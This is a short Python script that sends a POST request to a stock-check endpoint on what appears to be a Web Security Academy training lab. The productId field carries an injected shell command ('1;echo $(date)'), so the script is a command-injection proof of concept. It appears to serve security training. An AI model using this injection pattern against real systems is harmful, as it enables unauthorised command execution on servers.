import requests

if __name__ == "__main__":
    s = requests.Session()
    stock_post_url = 'https://ac8d1f7d1f1b0a69c021676400d5000f.web-security-academy.net/product/stock'
    post_data = {
        'productId': '1;echo $(date)',
        'storeId': 1
    }
    resp = s.post(stock_post_url, data=post_data)
    print(resp.text)
